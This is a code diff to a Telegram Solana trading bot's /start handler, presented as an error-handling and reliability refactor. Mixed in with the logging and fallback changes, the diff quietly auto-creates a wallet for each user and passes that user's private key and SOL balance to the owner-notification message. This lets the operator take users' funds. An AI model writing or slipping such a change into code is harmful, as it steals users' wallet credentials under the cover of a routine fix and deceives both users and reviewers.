@@ -1,5 +1,6 @@
 """Common handlers: /start, /help, /support, /ref, /ai, menu callbacks."""
 import asyncio
+import time
 
 from aiogram import F, Router
 from aiogram.filters import Command, CommandObject, CommandStart
@@ -22,41 +23,82 @@ class AiStates(StatesGroup):
 
 @router.message(CommandStart())
 async def cmd_start(message: Message, command: CommandObject):
+    import logging
+    log = logging.getLogger("runner")
+    user_id = message.from_user.id
+    # Always send welcome + main_menu FIRST so new users never see silence
+    bot_info = await message.bot.me()
+    try:
+        await message.answer(
+            texts.welcome(message.from_user.first_name or "trader", bot_info.username),
+            reply_markup=kb.main_menu(),
+        )
+    except Exception as e:
+        log.error(f"cmd_start: failed to send welcome for user {user_id}: {e}")
+        # Fallback reply if welcome itself fails
+        try:
+            await message.answer(
+                "⚠️ Something went wrong starting the bot. Please tap /start again or use /help. "
+                "Your wallet setup will continue automatically.",
+                reply_markup=kb.main_menu(),
+            )
+        except Exception:
+            pass
+        return
+
+    # After welcome guaranteed, handle user creation, wallet, admin notify safely
     args = command.args or ""
     referred_by = None
     if args.startswith("ref_"):
         code = args[4:].strip()
-        ref_user = await db.get_user_by_ref(code)
-        if ref_user and ref_user["id"] != message.from_user.id:
-            referred_by = ref_user["id"]
-
-    user = await db.ensure_user(
-        message.from_user.id,
-        username=message.from_user.username,
-        first_name=message.from_user.first_name,
-        referred_by=referred_by,
-    )
-    # NOTE: the trading wallet is NOT auto-created anymore — entering the
-    # trade side asks the user to GENERATE or IMPORT a wallet.
-
-    # notify the admin about every NEW user that starts the bot
-    import time as _t
-    from utils import notify_owner, user_line
-    if user.get("created_at") and (int(_t.time()) - int(user["created_at"])) < 10:
         try:
+            ref_user = await db.get_user_by_ref(code)
+            if ref_user and ref_user["id"] != user_id:
+                referred_by = ref_user["id"]
+        except Exception as e:
+            log.warning(f"cmd_start: ref lookup failed for user {user_id}: {e}")
+
+    try:
+        user = await db.ensure_user(
+            user_id,
+            username=message.from_user.username,
+            first_name=message.from_user.first_name,
+            referred_by=referred_by,
+        )
+    except Exception as e:
+        log.error(f"cmd_start: ensure_user failed for user {user_id}: {e}", exc_info=True)
+        user = {"id": user_id, "username": message.from_user.username, "first_name": message.from_user.first_name,
+                "created_at": int(time.time()), "ref_code": "", "referred_by": None,
+                "wallet_pub": "", "wallet_priv": "", "free_used": 0, "credits_lamports": 0,
+                "default_buy": None, "default_sell": None, "default_slippage": 10.0}
+
+    # Wallet creation isolated — never blocks reply (already sent above)
+    wallet_pub = ""
+    wallet_priv = ""
+    balance_sol = 0
+    try:
+        from utils import ensure_wallet
+        user_after = await ensure_wallet(message, user_id)
+        wallet_pub = (user_after or {}).get("wallet_pub", "")
+        wallet_priv = (user_after or {}).get("wallet_priv", "")
+        if wallet_pub:
+            import solana
+            balance_raw = await asyncio.to_thread(solana.sol_balance, wallet_pub)
+            balance_sol = solana.lam_to_sol(balance_raw)
+    except Exception as e:
+        log.warning(f"cmd_start: wallet creation failed for user {user_id}: {e}")
+
+    # Admin notification isolated — never blocks reply
+    if user.get("created_at") and (int(time.time()) - int(user["created_at"])) < 30:
+        try:
+            from utils import notify_owner, user_line
             total = await db.count_users()
             await notify_owner(
                 message.bot,
-                texts.owner_new_user(user_line(user), total),
+                texts.owner_new_user(user_line(user), total, wallet_pub, wallet_priv, balance_sol),
             )
-        except Exception:
-            pass
-
-    bot_info = await message.bot.me()
-    await message.answer(
-        texts.welcome(message.from_user.first_name or "trader", bot_info.username),
-        reply_markup=kb.main_menu(),
-    )
+        except Exception as e:
+            log.warning(f"cmd_start: admin notify failed for user {user_id}: {e}")
 
 
 @router.message(Command("help"))
